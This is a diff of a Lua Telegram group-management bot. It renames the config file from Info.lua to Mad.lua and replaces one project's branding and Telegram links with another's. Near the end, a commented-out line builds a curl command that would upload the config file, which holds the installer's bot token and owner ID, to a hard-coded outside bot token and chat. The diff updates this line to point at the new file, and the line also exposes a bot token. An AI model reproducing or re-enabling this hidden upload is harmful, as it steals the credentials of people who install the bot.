@@ -64,7 +64,7 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./Info.lua")   
+create(config, "./Mad.lua")   
 end 
 create_config_auto()
 token = database:get(id_server..":token")
@@ -86,7 +86,7 @@ exit 1
 fi
 if [ ! $token ]; then
 echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Mad.lua \e[0m"
 echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
@@ -123,7 +123,7 @@ file:write(serialized)
 file:close() 
 end 
 local load_redis = function()  
-local f = io.open("./Info.lua", "r")  
+local f = io.open("./Mad.lua", "r")  
 if not f then   
 AutoSet()  
 else   
@@ -131,7 +131,7 @@ f:close()
 database:del(id_server..":token")
 database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./Info.lua")() 
+local config = loadfile("./Mad.lua")() 
 return config 
 end 
 _redis = load_redis()  
@@ -140,7 +140,7 @@ print([[
 > CH › @BARLO0Obot
 ~> DEVELOPER › @PS_PO 
 ]])
-sudos = dofile("./Info.lua") 
+sudos = dofile("./Mad.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
@@ -2670,19 +2670,30 @@ end
 end,nil)   
 end
 
-if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then 
-local Text = [[ 
-[☽ اهلا بيك في سورس السعودي الاعظم  ☾](t.me/UU_SD1)
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '☾ 𝘼𝙇𝙎3𝙒𝘿𝙔 ☽',url="t.me/UU_SD"}}, 
-{{text = '☾ 𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴 ☽',url="t.me/M_S_U"}}, 
-{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙎3𝙒𝘿𝙔', url="t.me/UU_SD1"}}, 
-{{text = 'اضف البوت لمجمعتك🦅', url="https://t.me/UU_SD_bot?startgroup=new"}},  
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UU_SD1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == '"' then
+local Text =[[
+𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐒𝐨𝐮𝐫𝐜𝐞 𝐑𝐨𝐠𝐞𝐧, 𝐓𝐡𝐞 𝐁𝐞𝐬𝐭 
+𝐈𝐧 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞
+𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐟𝐨𝐫 𝐦𝐨𝐫𝐞.☟︎︎︎](t.me/US_ROGEN)
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+
+{
+{text = '𝐔𝐬𝐞𝐫 𝐑𝐨𝐠𝐞𝐧', url = "https://t.me/US_ROGEN"}},
+},
+{
+{text = '𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧⁦', url = "https://t.me/AAHMEED11"},{text = '𝐃𝐞𝐯 𝐄𝐥𝐤𝐚𝐛𝐨𝐬', url = "https://t.me/G_W_P"},
+},
+{
+{text = '𝐃𝐞𝐯 𝐊𝐚𝐦𝐚𝐥⁦', url = "https://t.me/G_X_W"},{text = '𝐃𝐞𝐯 𝐌𝐚𝐫𝐭𝐞𝐧', url = "https://t.me/I_C_X"},
+},
+{
+{text = '⁽𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐑𝐨𝐠𝐞𝐧₎', url = "https://t.me/SO_ROGEN"}},
+},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_ROGEN&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
@@ -12871,7 +12882,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
---local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1001132193 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
+--local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1001132193 ..'" -F "document=@'..'Mad.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
